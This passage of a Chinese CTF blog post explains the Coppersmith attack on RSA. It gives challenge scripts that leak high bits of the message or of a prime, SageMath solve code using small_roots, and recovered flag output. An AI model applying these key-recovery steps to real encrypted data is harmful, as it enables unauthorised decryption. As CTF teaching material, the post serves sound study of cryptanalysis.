xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mi>β</mi></msup><mo>≤</mo><mi>r</mi><mo>≤</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">n^{\beta}≤r≤X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9850779999999999em;vertical-align:-0.13597em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>范围内的根。所以有的时候我们就需要调整好我们传递的参数，否则就会导致<code>small_roots</code>返回的是空列表。<strong>beta这个参数还是比较奇妙的，有时候<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mi>β</mi></msup></mrow><annotation encoding="application/x-tex">n^\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span></span></span></span></span></span></span></span>有500位，但是我们还是可以得到200位的根这里先填个坑，之后再来解释一下，总之beta取值一定要在某个正确的范围内，否则会返回空列表(在不了解beta的取值原理时，我们其实都可以采取爆破的策略beta取值其实也就100种可能)</strong></li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n)) </span><br><span class="line">f = </span><br><span class="line">f = f.monic() </span><br><span class="line">out = f.small_roots(X=<span class="number">2</span>^n,beta=<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><h1 id="题型1_已知高位"><a class="markdownIt-Anchor" href="#题型1_已知高位"></a> 题型1_已知高位</h1><h2 id="题目1_已知m高位求低位"><a class="markdownIt-Anchor" href="#题目1_已知m高位求低位"></a> 题目1_已知m高位求低位</h2><ul><li>题目：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">r = os.urandom(<span class="number">58</span>)</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + r + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(m.bit_length())</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak = (m&gt;&gt;<span class="number">72</span>)&lt;&lt;<span class="number">72</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak = &#x27;</span>, leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="comment">#leak =  5364346700996002419782953699183539964838028506044205579153385131511046817129051651578134266343785810441589599993973488281743331245307218897879563440750592</span></span><br><span class="line"><span class="comment">#c =  40935151362933943549618319861069602822252994206384375794897447336909222247831278964858728027767056236448151125640558855254473877904819185119141154165089443796277880539873361002972028932876254906159097470466137303335170155152431248477323590112940870317475379089257767219445763033224635983039863076611351104336</span></span><br><span class="line"><span class="comment">#n= 117575455116027501138912629496694211426851342451722297844472247041789855520700682789833315967293375516507091916652099874126157193406739919014990279487154654321780811384714209768811626630753881580962486730634616085329659924119107924710021010092412019109403168379014063806220470892151350863781965096437381127661</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>在这种情况下，由于我们用于加密的<code>m</code>比较大，所以这题就不能使用低加密指数的方法来解。并且这题我们已经知道了<code>m</code>的高<code>440</code>位，这时我们就需要想办法去求<code>m</code>的低<code>72</code>位。我们先利用方程的思想，将<code>m</code>使用方程表达出来。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>设</mtext><mi>x</mi><mtext>表示</mtext><mi>m</mi><mtext>的低</mtext><mn>72</mn><mtext>位</mtext><mo separator="true">,</mo><mtext>而</mtext><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mtext>表示的是</mtext><mi>m</mi><mtext>的高</mtext><mn>440</mn><mtext>位</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>这时我们就有</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mo>=</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>+</mo><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>会有如下等式</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>3</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mtext> </mtext><mi>n</mi><mtext> </mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>用同余性质可得</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>m</mi><mn>3</mn></msup><mo>−</mo><mi>c</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><mi>c</mi><mo>≡</mo><mn>0</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mtext> </mtext><mi>n</mi><mtext> </mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>此时我们就可以得到关于</mtext><mi>x</mi><mtext>的多项式系数</mtext><mo separator="true">,</mo><mtext>最高次为</mtext><mn>3</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>经过验证得到</mtext><msup><mi>n</mi><mfrac><mn>1</mn><mn>3</mn></mfrac></msup><mtext>的</mtext><mi>b</mi><mi>i</mi><mi>t</mi><mtext>位为</mtext><mn>342</mn><mtext>位，而我们求的</mtext><mi>x</mi><mtext>为</mtext><mn>72</mn><mtext>位</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这就说明我们可以使用</mtext><mi>c</mi><mi>o</mi><mi>p</mi><mi>p</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>m</mi><mi>i</mi><mi>t</mi><mi>h</mi><mtext>攻击快速求根</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}设x表示m的低72位,而leak表示的是m的高440位\\这时我们就有\\m = leak + x\\会有如下等式\\c \equiv m^3\equiv(leak+x)^3~mod(~n~)\\用同余性质可得\\m^3-c \equiv (leak+x)^3-c\equiv 0 ~mod(~n~)\\此时我们就可以得到关于x的多项式系数,最高次为3\\经过验证得到n^{\frac{1}{3}}的bit位为342位，而我们求的x为72位\\这就说明我们可以使用coppersmith攻击快速求根\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:12.11402em;vertical-align:-5.80701em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.307009999999999em;"><span style="top:-8.467009999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">设</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">低</span><span class="mord">7</span><span class="mord">2</span><span class="mord cjk_fallback">位</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">而</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">高</span><span class="mord">4</span><span class="mord">4</span><span class="mord">0</span><span class="mord cjk_fallback">位</span></span></span><span style="top:-7.267009999999999em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">有</span></span></span><span style="top:-6.067009999999999em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span></span></span><span style="top:-4.867009999999999em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">式</span></span></span><span style="top:-3.667009999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathnormal">n</span><span class="mspace nobreak"> </span><span class="mclose">)</span></span></span><span style="top:-2.467009999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">质</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span></span></span><span style="top:-1.267009999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathnormal">n</span><span class="mspace nobreak"> </span><span class="mclose">)</span></span></span><span style="top:-0.06700999999999863em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">数</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">高</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">为</span><span class="mord">3</span></span></span><span style="top:1.2470100000000006em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">验</span><span class="mord cjk_fallback">证</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9540200000000001em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443142857142858em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">b</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord">3</span><span class="mord">4</span><span class="mord">2</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">为</span><span class="mord">7</span><span class="mord">2</span><span class="mord cjk_fallback">位</span></span></span><span style="top:2.44701em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">s</span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord cjk_fallback">攻</span><span class="mord cjk_fallback">击</span><span class="mord cjk_fallback">快</span><span class="mord cjk_fallback">速</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">根</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.80701em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>接下来我们就来使用<code>coppersmith</code>求解，这里比较简单的就是，我们在使用<code>small_roots()</code>这个函数的时候，并不需要调整参数。而是直接调用即可。主要是因为我们构造出的方程刚好是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><mi>c</mi><mo>≡</mo><mn>0</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mtext> </mtext><mi>n</mi><mtext> </mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(leak+x)^3-c\equiv 0 ~mod(~n~)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathnormal">n</span><span class="mspace nobreak"> </span><span class="mclose">)</span></span></span></span>，所以这题使用<code>coppersmith攻击</code>主要是求在模<code>n</code>的意义下，$ n^{\frac{1}{e}} $以内的根</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum </span><br><span class="line">leak =  <span class="number">5364346700996002419782953699183539964838028506044205579153385131511046817129051651578134266343785810441589599993973488281743331245307218897879563440750592</span></span><br><span class="line">c =  <span class="number">40935151362933943549618319861069602822252994206384375794897447336909222247831278964858728027767056236448151125640558855254473877904819185119141154165089443796277880539873361002972028932876254906159097470466137303335170155152431248477323590112940870317475379089257767219445763033224635983039863076611351104336</span></span><br><span class="line">n= <span class="number">117575455116027501138912629496694211426851342451722297844472247041789855520700682789833315967293375516507091916652099874126157193406739919014990279487154654321780811384714209768811626630753881580962486730634616085329659924119107924710021010092412019109403168379014063806220470892151350863781965096437381127661</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">m = leak + x</span><br><span class="line">m = m.monic()</span><br><span class="line">M = m((m^<span class="number">3</span>-c).small_roots()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(M)))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">5364346700996002419782953699183539964838028506044205579153385131511046817129051651578134266343785810441589599993973488281743331245309819287155072648189309</span></span><br><span class="line"><span class="string">b&#x27;flag&#123;\x82\x0e\xbf\x1fc\xbac\xcc\xb7n\x10!%(al\xa9\xdc8\xbc\xc9\xeb\xb6\xd5\x12\xc4 &amp;\xe1\x00 X\x8er\x96\xd2\x9f\xf2R\xd2\t,0I\xd9\x94\xe8H\xc8=\x8c\xf7\xa6\x8c\x9fm\xb1\x95&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>目前还不知道<code>coppersmith攻击原理</code>，如果要会用的话，过程其实就是这几步：<ul><li>第一步，确定多项式环中的模数。</li><li>第二步，确定多项式。</li><li>第三步，确定<code>coppersmith攻击</code>的条件是否满足。</li><li>第四步，调用<code>small_roots()</code>函数求解方程。</li></ul></li></ul><h2 id="题目2_已知p的高位求低位"><a class="markdownIt-Anchor" href="#题目2_已知p的高位求低位"></a> 题目2_已知p的高位求低位</h2><ul><li>题目如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = &#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak = &#x27;</span>, p &gt;&gt; <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c =  113586177374556404023302519526754665470570871476581572924010485271609182939576292258309693919183665334593269032771168258676196238354553238207372511638353179203781100360164950899879081096534890623159302893909393987089255020158056119954592555987794050357729528077439336645285541296688606433920178147114273163214</span></span><br><span class="line"><span class="string">n =  117400480938142315180437859683247427996874734449806782078398939334361106314549758122280645558538068023461810390291406250149045673033058236602564577080271495334738508492592434662896092890777780831354145755712206139360655422348268610020323769810399146777354043835879906538618644988182234583974095999379431384971</span></span><br><span class="line"><span class="string">leak =  6988520536508181139792486524710394841324279945751362186371062878730048665522475016854515443490</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这题的思路与题目一的思路比较像，但是却比题目一简单。因为这题直接设<code>p</code>的低位为未知数即可。这边就给出一张图片</li></ul><p><img src="/2025/03/29/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E4%B9%8BCoppersmith%E6%94%BB%E5%87%BB/image-20250401004541210.png" alt="image-20250401004541210"></p><ul><li>推导如下：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这题我们就可以直接设</mtext><mi>p</mi><mtext>的低位为</mtext><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这样我们就可以表示出</mtext><mi>p</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mo>=</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>&lt;</mo><mo>&lt;</mo><mn>200</mn><mo>+</mo><mi>x</mi><mo>=</mo><msub><mi>p</mi><mrow><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi></mrow></msub><mo>+</mo><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>我们可以从题目得到</mtext><mi>x</mi><mtext>的大小为</mtext><mn>200</mn><mtext>位</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以我们规定</mtext><mi>X</mi><mo 